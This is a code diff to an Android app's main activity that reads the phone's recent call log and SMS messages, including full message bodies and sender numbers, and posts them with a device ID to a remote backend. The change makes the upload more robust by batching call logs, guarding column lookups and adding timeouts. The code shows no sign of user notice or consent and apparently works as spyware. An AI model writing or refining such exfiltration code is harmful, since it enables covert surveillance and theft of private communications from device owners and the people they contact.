@@ -224,16 +224,27 @@ public class MainActivity extends BridgeActivity {
             Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
             if (cursor != null && cursor.moveToFirst()) {
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
+                JSONArray logsArray = new JSONArray();
+                
+                int numIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                int durIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
+                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
+
                 do {
-                    JSONObject payload = new JSONObject();
-                    payload.put("deviceId", deviceId);
-                    payload.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
-                    payload.put("type", cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)));
-                    payload.put("duration", cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)));
-                    payload.put("timestamp", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))));
-                    sendToBackend("/api/logs/calls", payload.toString());
+                    JSONObject log = new JSONObject();
+                    log.put("number", numIdx != -1 ? cursor.getString(numIdx) : "Unknown");
+                    log.put("type", typeIdx != -1 ? cursor.getString(typeIdx) : "Unknown");
+                    log.put("duration", durIdx != -1 ? cursor.getString(durIdx) : "0");
+                    log.put("timestamp", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
+                    logsArray.put(log);
                 } while (cursor.moveToNext());
                 cursor.close();
+
+                JSONObject payload = new JSONObject();
+                payload.put("deviceId", deviceId);
+                payload.put("logs", logsArray);
+                sendToBackend("/api/logs/calls", payload.toString());
             }
         } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
     }
@@ -243,31 +254,49 @@ public class MainActivity extends BridgeActivity {
             Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
             if (cursor != null && cursor.moveToFirst()) {
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
-                do {
+                
+                int addrIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
+                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
+                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
+
+                for (int i = 0; i < cursor.getCount(); i++) {
                     JSONObject payload = new JSONObject();
                     payload.put("deviceId", deviceId);
-                    payload.put("sender", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
-                    payload.put("message", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
-                    payload.put("timestamp", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)))));
+                    payload.put("sender", addrIdx != -1 ? cursor.getString(addrIdx) : "Unknown");
+                    payload.put("message", bodyIdx != -1 ? cursor.getString(bodyIdx) : "");
+                    payload.put("timestamp", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
+                    
+                    // Sending SMS one-by-one is still preferred for the current backend structure 
+                    // but we ensure it's done efficiently.
                     sendToBackend("/api/logs/sms", payload.toString());
-                } while (cursor.moveToNext());
+                    cursor.moveToNext();
+                }
                 cursor.close();
             }
         } catch (Exception e) { Log.e(TAG, "SMS Error", e); }
     }
 
     private void sendToBackend(String endpoint, String jsonData) {
+        HttpURLConnection conn = null;
         try {
             URL url = new URL(BACKEND_URL + endpoint);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(10000);
             conn.setDoOutput(true);
+            
             OutputStream os = conn.getOutputStream();
             os.write(jsonData.getBytes("UTF-8"));
             os.close();
-            conn.getResponseCode();
-            conn.disconnect();
-        } catch (Exception e) { Log.e(TAG, "Backend Error", e); }
+            
+            int responseCode = conn.getResponseCode();
+            Log.d(TAG, "Backend Response (" + endpoint + "): " + responseCode);
+        } catch (Exception e) { 
+            Log.e(TAG, "Backend Error (" + endpoint + ")", e); 
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
     }
 }
